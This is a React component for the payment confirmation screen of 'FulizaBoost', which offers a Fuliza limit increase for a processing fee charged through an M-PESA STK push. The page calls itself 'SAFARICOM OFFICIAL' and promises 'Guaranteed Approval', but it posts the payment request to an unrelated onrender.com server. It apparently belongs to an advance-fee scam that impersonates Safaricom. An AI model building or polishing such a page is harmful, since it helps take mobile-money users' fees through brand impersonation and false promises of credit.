import { useLocation, useNavigate } from "react-router-dom";
import { useState } from "react";
import "../styles/Confirmation.css";

const Confirmation = () => {
  const navigate = useNavigate();
  const { state } = useLocation();
  const { limit, fee, phone,username } = state || {};

  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null);

  const handlePay = async () => {
    if (!phone || !fee) {
      setMessage("Phone number or fee is missing!");
      return;
    }

    setLoading(true);
    setMessage(null);

    try {
      const response = await fetch("https://fulizaboost-f4ry.onrender.com/api/boosts/pay", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          fee,
          customer_name:username 
        }),
      });

      const data = await response.json();
      setLoading(false);

      if (data.success) {
        setMessage("Payment queued! Check your phone for MPESA prompt.");
        // Optionally navigate after a delay
        setTimeout(() => navigate("/success"), 2000);
      } else {
        setMessage("Payment failed: " + (data.message || "Try again"));
      }
    } catch (err: any) {
      console.error(err);
      setLoading(false);
      setMessage("Error: " + err.message);
    }
  };

  return (
    <main className="cf-container">
      {/* HEADER */}
      <div className="cf-header">
        <button className="back-btn" onClick={() => navigate(-1)}>←</button>
        <span className="header-title">Confirmation</span>
      </div>

      {/* BRAND */}
      <div className="cf-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </div>

      <hr />

      <h2 className="review-title">Review Request</h2>
      <p className="review-text">Please confirm your selection before we initiate the STK push.</p>

      {/* SUMMARY CARD */}
      <div className="summary-card">
        <div className="row">
          <span>New Limit</span>
          <strong className="green">Ksh {limit?.toLocaleString()}</strong>
        </div>
        <div className="row">
          <span>Processing Fee</span>
          <strong>Ksh {fee}</strong>
        </div>
        <hr />
        <div className="payment">
          <span className="label">PAYMENT PHONE</span>
          <p className="phone"><span className="dot" /> {phone}</p>
        </div>
      </div>

      {/* FOOTER */}
      <div className="cf-footer">
        <button className="pay-btn" onClick={handlePay} disabled={loading}>
          {loading ? "Processing..." : `Pay Ksh ${fee} & Boost`}
        </button>
        <button className="cancel-btn" onClick={() => navigate("/")}>Cancel Request</button>
        {message && <p className="info-text">{message}</p>}
      </div>
    </main>
  );
};

export default Confirmation;
